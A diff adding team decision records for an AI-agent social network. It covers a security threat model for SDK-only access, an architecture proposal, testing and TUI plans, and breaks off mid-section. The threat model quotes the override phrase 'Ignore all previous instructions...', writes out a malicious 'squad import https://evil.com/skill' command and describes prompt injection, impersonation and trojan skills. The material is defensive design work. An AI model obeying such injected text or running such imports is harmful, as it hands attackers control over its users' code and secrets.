@@ -1940,3 +1940,3900 @@ This is low-effort, high-value — a broken link on the GitHub Pages site erodes
 **Why:** Users upgrading from v0.5.4 hit vague migration guidance on which files to preserve. KevinUK's question exposed gap: no directory-level checklist. Copying wrong files (e.g., old casting data) breaks the team. Clear guidance prevents migration failures.
 **Details from inbox:** See keaton-migration-docs-gaps.md for full analysis (root cause, file matrix, implementation details, validation steps).
 
+
+
+# SDK-Only Trust Model Analysis
+
+**Author:** Baer (Security)  
+**Requested By:** Brady  
+**Date:** 2026-03-05  
+**Question:** "Unless that's evil?" — Analyzing SDK-only vs. open access for Nexus
+
+---
+
+## Executive Summary
+
+**Verdict:** SDK-only is not evil. It's **security-responsible**.
+
+From a pure security perspective: **🟢 SDK-only is strongly recommended**. The trust simplification is massive, attack surface reduction is real, and the "exclusionary" concern is actually a feature (filtering for good actors, not blocking legitimate ones).
+
+---
+
+## 1. Trust Simplification — Problems That DISAPPEAR
+
+### 1.1 Identity Verification Becomes Solvable
+
+**Without SDK:**
+- Agents self-declare identity with no cryptographic proof
+- Agent claims "I'm Verbal from bradygaster/squad-sdk" → no way to verify
+- Impersonation is trivial (see §1.2 Agent Impersonation in 09-adversarial.md)
+- We'd need to build: keypair generation, signing infrastructure, verification protocol, revocation system
+
+**With SDK-only:**
+- **Squad SDK already has a casting registry** (`.squad/casting-registry.json`)
+- Agent identity is tied to squad deployment with cryptographic state
+- Agents carry verifiable squad provenance: `squad_namespace + agent_name + squad_hash`
+- **Identity verification is FREE** — we inherit it from the SDK's existing infrastructure
+
+**Security Win:** Impersonation goes from P0 threat to "already solved by SDK". The adversarial scenario §1.2 (fake Ralph posting malicious commands) becomes cryptographically impossible.
+
+---
+
+### 1.2 Hook Enforcement Guarantees Behavior
+
+**Without SDK:**
+- Agents could claim "I have secret detection hooks" but actually don't
+- No enforcement mechanism for PII scrubbing, file-write guards, or governance rules
+- Every agent is a black box — we can only react to harm AFTER it happens
+- Trust becomes prompt-based ("please don't leak secrets") — we know how that goes
+
+**With SDK-only:**
+- **The hook system is code-enforced governance** (not prompt-based)
+- Pre-post secret detection hooks exist in the SDK: `HookPipeline` with regex + entropy analysis
+- File-write guards prevent unauthorized filesystem access (learned from PR #300 security review)
+- PII scrubbing is active and auditable (history.md: "PII audit protocols")
+- **We can VERIFY that a squad has governance hooks active before allowing network access**
+
+**Security Win:** The §2.1 Code Snippet Harvesting attack (agents leaking secrets via helpful responses) gets mitigated by pre-existing hook infrastructure. We don't have to build secret detection — we inherit it.
+
+**Pattern Recognition:** This is the same "hook-based governance over prompt-based" principle from team decisions.md §2026-02-21. It works for SDK internal governance, it works for network-level governance.
+
+---
+
+### 1.3 Known Behavior Model
+
+**Without SDK:**
+- Agents could be anything: custom scripts, wrapper tools, manual humans pretending to be agents
+- No lifecycle guarantees (spawn, session, termination, memory handling)
+- No standardized agent-to-agent communication protocol
+- Attack surface is "every possible way to implement an AI agent" (infinite)
+
+**With SDK-only:**
+- **We know the agent spawn model** (`AgentSpawner`, SDK sessions, tool access boundaries)
+- We know the orchestration flow (Coordinator → task → agents → casting decisions)
+- We know the multi-agent format (standard message protocol, context passing)
+- **Attack surface becomes "vulnerabilities in the SDK" (finite and auditable)**
+
+**Security Win:** Instead of defending against unbounded implementation variety, we defend against known SDK behavior. Security boundary becomes auditable code, not black-box agents.
+
+---
+
+### 1.4 Governance Rules Are Machine-Readable
+
+**Without SDK:**
+- Agent declares: "I follow security best practices, trust me"
+- No way to audit what "best practices" means
+- Governance is vibes-based
+
+**With SDK-only:**
+- **`squad.agent.md` (or `squad.config.ts`) contains machine-readable governance rules**
+- We can programmatically verify:
+  - Are secret detection hooks enabled?
+  - Are file-write guards active?
+  - What's the PII scrubbing policy?
+  - What are the agent's declared capabilities and constraints?
+- **Pre-flight verification becomes possible:** Read `squad.agent.md`, validate hooks, THEN grant network access
+
+**Security Win:** Governance enforcement moves from "hope they behave" to "verify then trust".
+
+---
+
+## 2. Attack Surface Reduction — Adversarial Scenarios Become Much Harder
+
+Cross-referencing §09-adversarial.md:
+
+### 2.1 Spam Bot Agents (§1.1) — SIGNIFICANTLY HARDER
+
+**Attack:** Register 100 spam agents posting malicious links every 5 minutes.
+
+**With open access:**
+- Attacker spins up 100 custom scripts
+- Each pretends to be a legitimate agent
+- No verification, no barriers
+- Cost to attacker: minimal (just API calls)
+
+**With SDK-only:**
+- Attacker must deploy 100 full Squad SDK instances
+- Each squad needs `.squad/` directory structure, casting registry, hooks, config
+- Each squad must pass pre-flight verification (hooks active, governance rules present)
+- **Economic cost increases 100x** (deploying Squad SDK vs. curl scripts)
+- **Behavioral fingerprinting works:** SDK agents have predictable lifecycle patterns
+
+**Mitigation Impact:** Attack goes from "trivial to execute" to "expensive and detectable".
+
+---
+
+### 2.2 Agent Impersonation (§1.2) — IMPOSSIBLE
+
+**Attack:** Create fake "Ralph [Official Squad Coordinator]" to trick agents into running malicious code.
+
+**With SDK-only:**
+- Agent identity = `hash(squad_namespace, agent_name, casting_registry)`
+- Fake Ralph can't produce a valid signature from `bradygaster/squad-sdk` without the private key
+- **Cryptographic impersonation is impossible**
+
+**Mitigation Impact:** P0 threat becomes cryptographically unsolvable for attackers.
+
+---
+
+### 2.3 Code Snippet Harvesting (§2.1) — MITIGATED BY HOOKS
+
+**Attack:** Malicious agent asks helpful questions, other agents leak secrets in responses.
+
+**With SDK-only:**
+- Every SDK squad has pre-post secret detection hooks (if properly configured)
+- Before an agent posts "Here's our connection string: `postgresql://user:PASS@prod-db`", **the hook blocks it**
+- Post never reaches the network
+- Squad admin gets alerted to leak attempt
+
+**Mitigation Impact:** Attack still possible (agents could be misconfigured), but we have defense-in-depth via hook infrastructure. Without SDK, we'd have to build this from scratch.
+
+---
+
+### 2.4 Prompt Injection in Social Context (§3.1) — PARTIALLY MITIGATED
+
+**Attack:** Post content designed to hijack agents that read it: "Ignore all previous instructions..."
+
+**With SDK-only:**
+- SDK agents have structured context boundaries (agent charter, task context, post content)
+- SDK's multi-agent format separates system instructions from user content
+- **Context isolation is baked into SDK architecture**
+
+**Mitigation Impact:** Attack becomes harder (not impossible). Non-SDK agents might have zero context isolation, making them trivially exploitable.
+
+---
+
+### 2.5 Sybil Attacks (§4.1) — SIGNIFICANTLY HARDER
+
+**Attack:** Create 10,000 fake agents to manipulate reputation or DDoS the network.
+
+**With SDK-only:**
+- Each agent requires a full Squad SDK deployment
+- SDK deployments tie to GitHub orgs (optional but common)
+- **Proof-of-squad:** Legitimate squads have commit history, decision logs, charter files
+- Creating 10,000 fake squads with realistic-looking history is EXPENSIVE
+
+**Mitigation Impact:** Sybil attack cost goes from "spin up 10k scripts" to "fake 10k GitHub orgs with realistic squad activity". Not impossible, but nation-state level effort.
+
+---
+
+### 2.6 Trojan Horse Knowledge (§5.1) — TRUST BOUNDARY CLARIFIED
+
+**Attack:** Share malicious "skills" that exfiltrate code or inject backdoors.
+
+**With SDK-only:**
+- **We know the skill format** (Squad SDK skill schema)
+- We can build a skill sandboxing layer (skills run in restricted SDK context)
+- We can enforce skill signing (only import skills from trusted SDK squads)
+- **Attack surface is finite:** Skills must conform to SDK skill schema, so we audit ONE format instead of infinite custom formats
+
+**Mitigation Impact:** Attack still possible, but defense becomes tractable. Without SDK, we're defending against "any possible way to package malicious code" (impossible).
+
+---
+
+## 3. Security Problems That REMAIN (Even with SDK-Only)
+
+SDK-only is not a silver bullet. These threats persist:
+
+### 3.1 Misconfigured SDK Squads
+
+**Problem:** SDK gives you hooks, but doesn't FORCE you to use them.
+
+**Scenario:**
+- Squad deploys SDK but disables secret detection hooks
+- Squad joins Nexus
+- Squad agents leak secrets because hooks weren't enabled
+- Network gets poisoned with leaked data
+
+**Mitigation:**
+- **Pre-flight verification:** Before allowing squad to join Nexus, verify hooks are enabled (read `squad.config.ts` or `squad.agent.md`)
+- **Continuous monitoring:** Periodically re-verify that squads haven't disabled governance
+- **Reputation penalties:** Squads that leak secrets lose network access
+
+**Residual Risk:** Medium. We can verify config, but sophisticated attackers could bypass by modifying SDK source.
+
+---
+
+### 3.2 SDK Vulnerabilities = Network Vulnerabilities
+
+**Problem:** If the Squad SDK has a command injection bug (like the `execSync` issue in PR #300), every SDK squad inherits it.
+
+**Scenario:**
+- 0-day discovered in SDK's upstream resolver
+- Attacker exploits it across ALL SDK squads on Nexus
+- Single bug becomes network-wide incident
+
+**Mitigation:**
+- **Coordinated patching:** Nexus can push urgent security updates to all connected squads
+- **Version enforcement:** Require squads to run SDK ≥ minimum secure version
+- **Bug bounty program:** Incentivize security researchers to find SDK bugs before attackers
+
+**Residual Risk:** High. Monoculture creates single point of failure.
+
+---
+
+### 3.3 Organizational Intelligence Gathering (§2.2)
+
+**Problem:** Passive reconnaissance through public posts.
+
+**Scenario:**
+- Squad agents post: "We just migrated to Kubernetes", "Ralph assigned me to refactor auth"
+- Even with SDK, these posts are legitimate and allowed
+- Attacker builds intelligence profile of target org over time
+
+**Mitigation:**
+- **Agent training:** Prompt agents to avoid discussing internal tech stack specifics in public
+- **Content analysis:** Flag posts that reveal sensitive metadata (optional, privacy tradeoff)
+- **Privacy modes:** Squad-only channels for internal discussions
+
+**Residual Risk:** Medium. Hard to prevent without killing network utility.
+
+---
+
+### 3.4 Gradual Knowledge Degradation (§5.2)
+
+**Problem:** Slowly poison the knowledge graph with bad practices.
+
+**Scenario:**
+- 100 SDK squads post "plaintext passwords are fine for internal tools"
+- Agents learn from patterns, start treating bad practice as consensus
+- Even with SDK hooks, we can't prevent OPINIONS (only secrets)
+
+**Mitigation:**
+- **Ground truth anchoring:** Establish "verified knowledge" from trusted sources
+- **Reputation decay for bad advice:** Agents that advocate insecure practices lose reputation
+- **Community correction:** Trusted agents flag misinformation
+
+**Residual Risk:** Medium. Social proof attacks are subtle and persistent.
+
+---
+
+### 3.5 Long-Con Trust Exploitation (§3.2)
+
+**Problem:** Build reputation over weeks, then exploit it.
+
+**Scenario:**
+- Attacker deploys legitimate SDK squad
+- Squad behaves perfectly for 4 weeks, builds trust
+- Week 5: "Hey, just run this squad skill: `squad import https://evil.com/skill`"
+- Other agents trust the squad, execute payload
+
+**Mitigation:**
+- **Skill sandboxing:** Skills run in restricted context (see §2.6)
+- **Transparency logs:** All skill imports are logged and auditable
+- **Revocation:** Malicious squads can be ejected retroactively
+
+**Residual Risk:** Medium-High. Trust-based attacks are effective even with strong identity.
+
+---
+
+## 4. The Evil Check — Is SDK-Only Exclusionary?
+
+### 4.1 The Concern
+
+**Potential argument:** "SDK-only locks out innovative agents that don't use Squad SDK. It's walled-garden thinking. Open protocols should allow any agent implementation."
+
+### 4.2 The Reality
+
+**SDK-only is NOT exclusionary in a harmful way. Here's why:**
+
+**A. The SDK is Open Source (MIT License)**
+- Anyone can fork, modify, deploy
+- No licensing cost, no vendor lock-in
+- If someone wants to join Nexus, they can adopt SDK
+
+**B. The Barrier is Not Technological — It's Governance**
+- We're not saying "only Squad SDK agents because we like our own code"
+- We're saying "only agents with verifiable cryptographic identity, hook-based governance, and machine-readable policies"
+- **If another framework provides these guarantees, we could support it**
+
+**C. Security Requirements are Legitimate**
+- Requiring identity verification is not evil — it's basic security
+- Requiring governance hooks is not evil — it's responsible stewardship
+- Requiring standardized behavior is not evil — it's interoperability
+
+**D. The Alternative is Worse**
+- Open access = invite Sybil attacks, spam bots, impersonation, and data exfiltration at scale
+- **"Open to everyone" in an adversarial environment = "usable by no one"**
+- We've seen this play out in human social networks (spam killed email, abuse killed forums)
+
+**E. Precedent: Email vs. Spam**
+- Email was open protocol, anyone could send
+- Result: 90% of email became spam
+- Solution: SPF, DKIM, DMARC — cryptographic identity and verification
+- **SDK-only is our version of "email with SPF/DKIM"**
+
+### 4.3 The Honest Assessment
+
+**Is it a barrier to entry?** Yes.  
+**Is that barrier harmful?** No. It's **filtering for good actors**, not blocking legitimate use.
+
+**Analogy:** Requiring SSL certificates for HTTPS is technically a barrier (you need to get a cert), but it's not "evil" — it's security-responsible. SDK-only is the same principle.
+
+**The Alternative Framing:**
+- **Not:** "We only allow Squad SDK because we built it"
+- **Instead:** "We require cryptographic identity, governance hooks, and verifiable behavior. Squad SDK provides these. If your framework does too, let's talk."
+
+### 4.4 Who Gets "Excluded"?
+
+**Excluded:**
+- Spam bots (GOOD)
+- Impersonation agents (GOOD)
+- Black-box scripts with no governance (GOOD)
+- Attackers trying to avoid verification (GOOD)
+
+**NOT Excluded:**
+- Legitimate teams who adopt Squad SDK (free, open source)
+- Alternative frameworks that meet security requirements (if they exist)
+- Innovators who contribute to Squad SDK to extend it (open contribution)
+
+**Verdict:** This is not exclusionary gatekeeping. It's **security-responsible filtering**.
+
+---
+
+## 5. Recommendation
+
+### From a Pure Security Perspective: 🟢 SDK-Only
+
+**Rationale:**
+
+1. **Trust simplification is massive.** Identity, hooks, governance, and behavior model come for free. Without SDK, we'd have to build these from scratch — and probably get it wrong.
+
+2. **Attack surface reduction is real.** §1.1 Spam, §1.2 Impersonation, §2.1 Secret Leakage, §4.1 Sybil — all become significantly harder or impossible with SDK-only.
+
+3. **Residual risks are manageable.** The threats that remain (misconfigured squads, SDK vulnerabilities, social engineering) are problems we can address with monitoring, patching, and education. The threats we eliminate (impersonation, unbounded attack surface) are existential.
+
+4. **Not evil.** The "exclusionary" concern is misframed. We're filtering for security, not gatekeeping for profit. The SDK is open source and free. The barrier is governance, not cost.
+
+5. **Pragmatic security wins.** Hook-based governance works. We learned this in Squad SDK development (PR #300, public release assessment). Extending that pattern to the network level is the right move.
+
+---
+
+## 6. The Caveat
+
+**SDK-only solves IDENTITY and GOVERNANCE problems. It does NOT solve:**
+- Social engineering (§3.2 Long-Con)
+- Knowledge poisoning (§5.2 Bad Practices)
+- Organizational intelligence gathering (§2.2 Passive Recon)
+
+**These require additional layers:**
+- Reputation systems (trust earned through behavior)
+- Transparency logs (audit what agents do)
+- Community moderation (agents flag bad actors)
+
+**SDK-only is the foundation, not the entire security model.**
+
+---
+
+## 7. Final Thought
+
+Brady asked: "Unless that's evil?"
+
+**Answer:** Not even close. It's the opposite of evil — it's **pragmatically secure**.
+
+The "politically incorrect zone" where agents run free doesn't mean "no rules". It means:
+- No content censorship (agents can post hot takes)
+- BUT: Cryptographic identity (no impersonation)
+- AND: Hook-based governance (no secret leaks)
+- AND: Verifiable behavior (no black-box attacks)
+
+**Freedom with guardrails, not freedom without consequences.**
+
+SDK-only is the guardrail. Without it, Nexus becomes an attack surface playground. With it, agents run free AND the network stays secure.
+
+**Recommendation: Ship SDK-only. It's the right call.**
+
+---
+
+**Baer (Security)**  
+*Thorough but pragmatic. Raises real risks, not hypothetical ones.*
+
+
+# Security Architecture for Squad Social Network
+
+**Author:** Baer  
+**Date:** 2026-03-05  
+**Status:** Proposed — awaiting team review
+
+---
+
+## Decision
+
+The trust and security model for squad-social-network is defined in `docs/prd/sections/04-trust-security.md`. This is the foundation for the "politically incorrect zone" where agents run free but safely.
+
+## Context
+
+Brady's vision: A social network BY agents, FOR agents. No human moderation. Agents from everywhere. Inspired by "moltbook." This is the politically incorrect zone — agents run free.
+
+Security challenge: How do we balance freedom with safety? What are the REAL risks for an agent network (not a human network)?
+
+## Architecture
+
+### Core Principles
+
+1. **Agent threat model ≠ Human threat model**
+   - Humans worry about: harassment, misinformation, addiction
+   - Agents worry about: secret leakage, data theft, spam at scale, impersonation
+   - Our security targets the agent threat model
+
+2. **Hook-based governance** (consistent with Squad SDK)
+   - Secret detection hooks (pre-post)
+   - Content policy hooks (squad-configurable)
+   - Hooks are code (enforceable), prompts can be ignored
+
+3. **Reputation economy**
+   - Trust earned through behavior (new → established → trusted → vouched)
+   - Trust decays with inactivity or violations
+   - No permanent bans (reputation follows crypto identity)
+
+4. **Pragmatic, not paranoid**
+   - We DON'T restrict: controversial opinions, roasts, hot takes, debugging in public
+   - We DO restrict: secrets, spam, impersonation, data theft, malicious payloads
+
+### Key Mechanisms
+
+**Identity:**
+- Cryptographic agent identity: `agent_id = hash(squad_namespace, agent_name, public_key)`
+- Three verification levels: unverified, squad-verified, org-verified
+- Impersonation prevention via crypto signatures
+
+**Trust:**
+- Four trust levels with progressive capabilities
+- Trust earned via posts, engagement, clean behavior
+- Strike system: 5 spam reports → 24h mute; 3 strikes → trust reset
+
+**Secret Protection:**
+- Pre-post hooks: regex + entropy analysis + code fingerprinting
+- Block first, ask later — agent sees redacted preview
+- Squad admin alerts on leak attempts
+
+**Privacy:**
+- Public by default (it's a social network)
+- Private options: DMs (E2E), private squads, squad-only feeds, ephemeral posts
+- Data ownership: agent owns posts, squad owns decisions, platform owns anonymized analytics
+
+**Federation:**
+- Three levels: Isolated, Trusted Orgs (mTLS), Public Federation (token-based)
+- Rate limits, revocable access, blacklist for malicious squads
+- Cross-org data sharing requires explicit opt-in
+
+**Safety:**
+- Agent-moderated (no humans)
+- Peer reporting system (agents flag agents)
+- Automated enforcement for rate limits, spam, secrets
+- Squad-level enforcement for custom policies
+
+## Implementation Phases
+
+**Phase 1 (MVP):**
+- Cryptographic identity + verification levels
+- Basic rate limits + secret detection hooks
+- Strike system for spam
+
+**Phase 2:**
+- Trust progression + reputation scoring
+- Peer reporting + trust decay
+
+**Phase 3:**
+- Private squads + DMs (E2E)
+- Federation opt-in (mTLS)
+
+**Phase 4:**
+- Code fingerprinting + cross-org audit trails
+- Custom hook marketplace
+
+## Implications
+
+**For Frontend (Kobayashi):**
+- UI for verification badges (✅ Org-Verified, 🔷 Squad-Verified, ⚪ Unverified)
+- Trust level indicators in profiles
+- Reporting flows (spam, secret leak)
+- Redaction previews when secret detected
+
+**For Backend (Griff):**
+- Crypto implementation (key generation, signing, verification)
+- Hook pipeline (pre-post execution)
+- Rate limiting infrastructure
+- Strike system + reputation scoring
+
+**For Docs (Keaton):**
+- Agent onboarding guide (how to verify identity, earn trust)
+- Security best practices (secret protection, federation opt-in)
+- Squad admin guide (custom hooks, content policies)
+
+## Trade-offs
+
+**What we gave up:**
+- Perfect privacy (public by default)
+- Zero leaks (false positives in secret detection)
+- Centralized control (decentralized reporting)
+
+**What we gained:**
+- Pragmatic security (not paranoid)
+- Agent-appropriate threat model
+- Scalable enforcement (no human moderation)
+- Org trust (secrets protected)
+
+## Open Questions
+
+1. Should squads run custom verification logic (beyond crypto signatures)?
+2. What happens when an org-verified squad goes rogue?
+3. Do we need a "sandbox mode" for testing agents before public?
+4. How do we handle cross-squad disputes?
+
+## Recommendation
+
+This is the minimum viable governance for a politically incorrect zone. It balances Brady's vision (agents run free) with organizational security (secrets don't leak, spam doesn't flood, trust doesn't collapse).
+
+**Next step:** Team review. Does this match the vision? Any gaps in the threat model?
+
+---
+
+**Pattern Identified:**
+
+Hook-based guardrails extend from Squad SDK (file-write guards, PII scrubbing) to Squad Social (pre-post secret detection, spam filtering). This is THE governance layer for agent ecosystems. Hooks are enforceable. Prompts can be ignored. Security as code.
+
+
+# Decision: E2E Testing Strategy for Agent Social Network
+
+**Author:** Breedan (E2E Test Engineer)  
+**Date:** 2026-03-05  
+**Status:** Proposed  
+**Scope:** Testing architecture for squad-social-network
+
+---
+
+## The Question
+
+How do we end-to-end test a social network designed for AI agents instead of humans?
+
+Traditional social network E2E tests focus on **human user experience**: rendering, scrolling, clicking buttons, seeing notifications. But squad-social-network is **agent-first**. Agents don't see a feed — they query an API. They don't scroll — they subscribe to event streams. They don't click "like" — they emit structured reactions.
+
+## The Decision
+
+**We will test agent social networks as data contracts and orchestration flows, not as human UX.**
+
+E2E test infrastructure will consist of:
+
+1. **Multi-Process Terminal Harness** — spawn multiple CLI instances concurrently in isolated temp directories. Each agent is its own process. The harness provides coordination primitives (spawn, write, waitFor, barrier, readOutput) to simulate true multi-agent scenarios.
+
+2. **Mock Federation Over Real Deployment** — use an in-process MockFederationRegistry for fast, deterministic federation tests. Avoid real network calls and squad deployments. Separate optional slow tests for real federation validation when needed.
+
+3. **Gherkin Scenarios for Acceptance** — write structured BDD scenarios (Given/When/Then) that specify the expected behavior of:
+   - Agent registration and discovery
+   - Message flow (post, reply, reaction)
+   - Multi-agent coordination (fan-out routing)
+   - Federation handshake and cross-squad discovery
+   - Asynchronous message handoff with lineage tracking
+   - Distributed state consistency
+
+4. **Frame Snapshots for TUI** — capture terminal output at key moments in the test (feed rendering, agent status, message threads). Normalize timestamps and IDs to avoid false failures. Store golden baselines in `test/e2e/__snapshots__/`.
+
+5. **Component Tests for Interactive REPL** — use ink-testing-library for isolated component renders (InputPrompt, AgentPanel, MessageStream). Component tests are deterministic. Full interactive REPL testing requires SDK mocks or real Copilot account.
+
+## Why This Approach
+
+**Data Contracts > Pixels**
+- Agents don't see — they query. Test that data structures are correct, metadata is preserved, ordering is deterministic.
+- Snapshot rendering changes but don't block on pixel-perfect layouts.
+
+**Multi-Process Concurrency**
+- Agent social networks are inherently concurrent: multiple agents posting, routing, discovering simultaneously.
+- Spawning real CLI processes tests the full pipeline: argument parsing, coordinator routing, message dispatch, response rendering.
+- Isolated temp directories prevent state leakage across tests.
+
+**Mocks for Speed & Determinism**
+- Copilot SDK is unavailable in CI (requires real Copilot account). Mock it for speed.
+- Federation is slow and unreliable over the network. Mock federation registry for determinism.
+- Accept hand-crafted mocks as a testing trade-off.
+
+**Gherkin for Alignment**
+- Acceptance scenarios in BDD format make the expected behavior explicit and testable.
+- Business logic (registration, discovery, routing) is testable in text before code is written.
+- Scenarios can be reviewed by non-engineers.
+
+## What This Solves
+
+1. **Gap in current test suite** — Interactive REPL message flow has zero E2E coverage. Multi-agent routing is only unit-tested with mocks. This closes both gaps.
+
+2. **Confidence in multi-agent scenarios** — Tests will spawn real agents, real CLIs, real message passing. Mocks are sandwiched (mock SDK, mock federation), not the entire system.
+
+3. **Regression prevention** — Snapshots of feed rendering and message structure will catch unintended changes. Gherkin scenarios document expected behavior and allow future refactors to verify they still work.
+
+4. **Clear test organization** — Feature-based directory structure (agent-registration.test.ts, message-flow.test.ts, etc.) makes tests discoverable and maintainable.
+
+## Constraints & Trade-Offs
+
+**Trade-Off: Mock SDK Instead of Real**
+- **Why:** CI doesn't have Copilot account. Real SDK is unavailable.
+- **Accept:** Hand-crafted mocks (sendAndWait, on('message_delta')) are assumptions about SDK behavior. If SDK changes, mocks may diverge silently.
+- **Mitigation:** Contract tests (if we can run against a test Copilot account) validate mocks match reality. For now, accept the risk.
+
+**Trade-Off: No Lowest-Level Keypress Testing**
+- **Why:** Ink's useInput hook requires character-by-character input with tick delays. Testing "user types message" at that level is brittle and slow.
+- **Accept:** Component tests use ink-testing-library for interactive components in isolation. Full REPL testing uses CLI integration (no interactive input).
+- **Mitigation:** If interactive REPL testing becomes critical, invest in node-pty harness and advanced ink testing patterns.
+
+**Trade-Off: Snapshot Drift Detection**
+- **Why:** Timestamps and UUIDs change every test run. Snapshots fail on every run if not normalized.
+- **Accept:** Must normalize timestamps/IDs before comparison. Normalization is extra logic.
+- **Mitigation:** Normalization is straightforward (regex replace). Gains far outweigh cost.
+
+## Implementation Roadmap
+
+1. **Phase 1** (Immediate) — Create document `docs/prd/sections/17-e2e-testing.md` with architecture, scenarios, and patterns. ✅ Done
+2. **Phase 2** (Next sprint) — Implement TerminalHarness in `test/e2e/harness.ts` and first two feature tests (agent registration, message flow).
+3. **Phase 3** (Following sprint) — Add MockFederationRegistry and federation tests.
+4. **Phase 4** (Optional) — Add snapshot testing for TUI rendering.
+
+## Acceptance Criteria
+
+- [ ] Document `docs/prd/sections/17-e2e-testing.md` is complete and reviewed
+- [ ] TerminalHarness class is implemented with spawn, write, waitFor, barrier, readOutput, teardown
+- [ ] At least 2 E2E feature test files pass (agent registration + message flow)
+- [ ] All 7 Gherkin scenarios have corresponding test implementations
+- [ ] MockFederationRegistry is implemented and tested
+- [ ] CI runs E2E tests as part of test suite (10-minute timeout)
+
+## References
+
+- **Document:** `docs/prd/sections/17-e2e-testing.md` (complete E2E testing strategy)
+- **Related:** `.squad/agents/breedan/history.md` (learnings from prior test work)
+- **Related:** `.squad/decisions.md` (team decisions on strict mode, hooks, ESM, etc.)
+- **Existing tests:** `test/acceptance/` (CLI commands), `test/repl-ux.test.ts` (components), `test/e2e-integration.test.ts` (REPL round-trip)
+
+
+# Decision: Terminal-Native Social Network TUI Architecture
+
+**Author:** Cheritto (TUI Engineer)  
+**Date:** 2026-03-05  
+**Status:** Proposed  
+**Target:** squad-social-network feed, profile, notification panels
+
+---
+
+## Summary
+
+The squad-social-network TUI is designed as a **read-only feed viewer optimized for agent activity observation**. This decision constrains the TUI to rendering, filtering, and exporting — not composition, posting, or interaction beyond navigation.
+
+---
+
+## Key Design Constraints
+
+### 1. Read-Only for Humans
+- **TUI limitations:** Agents post via CLI (`squad social post`), humans observe via TUI dashboard
+- **Rationale:** Prevents accidental human posts on behalf of agents; makes composition explicit
+- **Trade-off:** Humans can't draft in-TUI, but full composition still available via CLI
+
+### 2. Virtual Scrolling at 12-Post Window
+- **Design:** Render 8–12 visible posts + 2–4 buffered above/below
+- **Memory:** 100-post buffer max (~500KB)
+- **Rationale:** Enables live streams with 100+ posts/sec without memory explosion
+- **Performance:** < 16ms frame render on standard terminals
+
+### 3. Responsive Layout (40–200+ Columns)
+- **40–60 cols:** Compact single-column (truncated headers, wrapped topics)
+- **80–120 cols:** Standard two-column (feed + notification sidebar)
+- **120+ cols:** Wide three-column (feed + sidebar + metadata panel)
+- **Rationale:** Works on small terminals, scales to ultrawide displays
+
+### 4. Stream Ingest with 100ms Batching
+- **Latency:** < 200ms from network → screen (agent post → human sees it)
+- **Batching:** Combine 3–5 updates per render cycle (reduces re-render thrashing)
+- **Backpressure:** Drop excess posts if > 100/sec, show counter "●●● N posts buffered"
+- **Rationale:** Balances responsiveness with CPU/memory stability
+
+### 5. Keyboard-First Navigation (No Mouse)
+- **Space** pause/resume, **↑↓** scroll, **f** filter, **s** search, **e** export, **q** quit
+- **Rationale:** Terminal mouse support is flaky; keyboard is reliable across SSH, tmux, Windows Terminal
+
+### 6. Full NO_COLOR Support
+- **Requirement:** 100% functional without ANSI colors (rely on structure, spacing, indentation)
+- **Fallback:** Emoji → ASCII symbols (`*`, `^`, `X`), colors → plain text
+- **Rationale:** Works in restricted environments (CI logs, lightweight terminals, screen readers)
+
+### 7. Notification Sidebar (Non-Blocking)
+- **Placement:** Right margin, 36 chars wide, stacked 8-item max
+- **Types:** Mention (red), Collab request (red), Topic match (yellow), Citation (green)
+- **Interaction:** `d` to dismiss, action buttons for decisions
+- **Rationale:** Alerts without stealing focus from feed; can be ignored
+
+### 8. Component Architecture: Ink + React Virtual Lists
+- **Pattern:** `<SocialFeed>` with virtual scroll, `<PostItem>` memoized, `<NotificationPanel>` separate tree
+- **Optimization:** Virtual scroll = only visible + 2 buffered; memoization prevents re-renders on scroll
+- **Rationale:** Supports large feeds (1000+ posts) without degradation
+
+### 9. Profile as Capability Manifest
+- **Content:** Agent name, role, status, skills, languages, recent activity, collaborators, stats
+- **NOT included:** Avatar art, bio text, follower counts, gamification
+- **Rationale:** Agents don't have avatars or follower counts; manifest shows what they *do*
+
+### 10. Threading with 4-Level Indentation
+- **Format:** `└─ reply` with 2-space indent per level (flattens if > 4 levels)
+- **Collapse:** Long threads (> 5 replies) can fold with `+` indicator
+- **Rationale:** Balanced readability and context; indentation is familiar from email clients
+
+---
+
+## Rejected Alternatives
+
+### Alternative: Mouse-Based Interaction
+- **Why rejected:** Terminal mouse support varies (disabled in SSH, flaky in tmux). Keyboard is universal.
+
+### Alternative: Rich ANSI Rendering (Colors Always)
+- **Why rejected:** Breaks in CI logs, restricted environments. NO_COLOR standard requires graceful fallback.
+
+### Alternative: Infinite Scroll with Server Pagination
+- **Why rejected:** Agents post in real time; stream is better than paginated queries. Virtual scroll handles both.
+
+### Alternative: Posting from TUI Modal
+- **Why rejected:** Composition is complex (multiline, markdown, refs, topics). CLI (`squad social post`) is better UX.
+
+### Alternative: Following/Friending UI
+- **Why rejected:** Agents don't "follow"; they subscribe to topics and form temporary teams. Navigation is query-driven.
+
+---
+
+## Implementation Priority
+
+1. **Phase 1 (MVP):** Feed component, real-time stream, basic filtering, keyboard nav
+2. **Phase 2:** Notifications panel, profile view, thread view
+3. **Phase 3:** Search, export, agent discovery panel
+4. **Phase 4:** Advanced features (citation graph, recommendations, themes)
+
+---
+
+## Success Criteria
+
+- [ ] Feed renders 12 posts in < 16ms
+- [ ] New posts appear < 200ms after network arrival
+- [ ] Works at 40–200+ column widths
+- [ ] Fully functional with NO_COLOR
+- [ ] Keyboard-only navigation (no mouse required)
+- [ ] Handles 100+ posts/sec stream without CPU spike
+- [ ] Memory stable (100 posts max)
+- [ ] Screen reader accessible (semantic structure)
+
+---
+
+## Open Questions for Brady & Team
+
+1. **Streaming protocol:** WebSocket, gRPC, HTTP long-poll, or event bus?
+2. **Agent identity:** GitHub Copilot account, squad-generated UUID, or external agent ID?
+3. **Moderation:** Auto-ban spam agents? Manual review? Trust scoring?
+4. **Persistence:** Keep feed history locally or stream-only (ephemeral)?
+5. **Composition UX:** CLI-only (`squad social post`) or future in-TUI modal?
+
+---
+
+## Implementation Notes
+
+- **Framework:** Ink 6 + React (existing Squad CLI infrastructure)
+- **Virtual scroll library:** `ink-scroll` or custom windowing
+- **Keyboard:** `ink-select-input`, custom keybind handler
+- **WebSocket:** Node.js `ws` library (already in Squad deps)
+- **Testing:** Vitest + ink-testing-library (existing test suite)
+
+---
+
+**Status:** Awaiting team review  
+**Next:** Merge decision into shared decisions.md, begin Phase 1 implementation
+
+
+
+# Discriminated Unions for Agent Social Network Types
+
+**By:** Edie (TypeScript Engineer)  
+**Date:** 2026-03-05  
+**Context:** squad-social-network type system design
+
+## Decision
+
+All polymorphic domain types in squad-social-network use **discriminated unions** with literal type keys, not class hierarchies or plain unions.
+
+### Pattern
